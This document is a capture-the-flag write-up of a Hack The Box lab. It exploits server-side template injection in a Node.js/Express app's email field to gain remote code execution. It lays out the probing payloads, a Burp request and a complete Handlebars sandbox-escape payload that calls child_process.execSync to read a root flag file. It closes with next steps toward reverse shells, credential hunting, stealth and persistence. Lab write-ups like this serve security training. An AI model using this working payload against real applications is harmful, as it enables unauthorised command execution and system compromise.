# 💥 Hack The Box - Node.js SSTI to RCE Walkthrough  
**Target IP**: `10.129.99.197`  
**Tech Stack**: Node.js, Express  
**Vuln Type**: SSTI → RCE  
**Tools Used**: Nmap, Wappalyzer, Burp Suite, curl  

---

## 🔍 Initial Recon - Discovering the Stack

```bash
nmap -sV -sC 10.129.99.197
```

🎯 Output:
```
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu
80/tcp open  http    Node.js (Express middleware)
```

We confirmed the web service is running **Node.js with Express**.  
🔗 Further tech stack recon via [Wappalyzer](https://www.wappalyzer.com/) showed Node + Express on the backend.

---

## 🕸️ Web App Behavior - Input Reflection Found!

We accessed the web interface and quickly discovered an **input field** that:

- Accepts user-submitted content  
- Reflects it **back on the page almost instantly**  

🧠 This is a strong candidate for **SSTI (Server-Side Template Injection)**!

---

## 🧪 Testing for SSTI

We attempted several common SSTI test payloads:

```text
{{7*7}}         ✅ caused a server error! 💥
${7*7}          ❌ no effect
<%= 7*7 %>      ❌ no effect
${{7*7}}        ❌ no effect
#{7*7}          ❌ no effect
```

✅ `{{7*7}}` triggering an error was our signal that **SSTI is likely present**, and **Handlebars.js** may be in use.

---

## 📬 Intercepting Requests - Burp Suite Activated

We captured the form submission via Burp:

```
POST / HTTP/1.1
Host: 10.129.99.197
Content-Type: application/x-www-form-urlencoded

email={{7*7}}&action=Submit
```

🧠 The `email` field reflects content — our attack surface confirmed!

---

## 🧠 Exploitation Strategy - Escaping the Sandbox

Initial payloads like:

```handlebars
{{this.push "return require('child_process').exec('whoami')"}}
```

❌ Failed with: `require is not defined`  
➡️ This suggests the **template engine is sandboxed**.

---

## 🧠 Breakout via `process.mainModule`

### ✅ 1. `process` object is accessible

```handlebars
{{this.push "return process"}}
```

Output: `[object process]`  
Boom! Access to the `process` object confirmed.

---

### ✅ 2. Enumerated mainModule

```handlebars
{{this.push "return process.mainModule"}}
```

Response showed full module structure — jackpot.

---

### ✅ 3. Gained `require` via mainModule

```handlebars
{{this.push "return process.mainModule.require('child_process')"}}
```

✅ Success! `child_process` was returned as an object — module load confirmed!

---

### ✅ 4. Executed Arbitrary Commands

```handlebars
{{this.push "return process.mainModule.require('child_process').execSync('whoami')"}}
```

full
```bash
{{#with "s" as |string|}}
 {{#with "e"}}
 {{#with split as |conslist|}}
 {{this.pop}}
 {{this.push (lookup string.sub "constructor")}}
 {{this.pop}}
 {{#with string.split as |codelist|}}
 {{this.pop}}
 {{this.push "return process.mainModule.require('child_process').execSync('cat /root/flag.txt');"}}
 {{this.pop}}
 {{#each conslist}}
 {{#with (string.sub.apply 0 codelist)}}
 {{this}}
 {{/with}}
 {{/each}}
 {{/with}}
 {{/with}}
 {{/with}}
{{/with}}
```

💥 Output: `root`  
RCE achieved! 🎉

---

## 🔄 Summary of Exploitation Chain

```text
1. Found SSTI in email field → {{7*7}} triggered error
2. Discovered template engine used Handlebars.js
3. Tried require() → blocked
4. Accessed global process object → allowed
5. Accessed process.mainModule → success
6. Used mainModule.require() to import child_process
7. Used execSync() to run shell commands
8. Got command output (e.g., whoami → root)
```

---

## 🔚 Next Steps

- 🐚 Use `execSync()` to launch reverse shell
- 🔍 Enumerate file system, users, credentials
- 🧼 Clean payloads for stealth or chaining
- 🔒 Consider persistence options

---  

🏁 **Mission Status**: RCE confirmed via Handlebars SSTI → Node.js global object abuse → command execution. Time to pivot and escalate. 👑🐚  
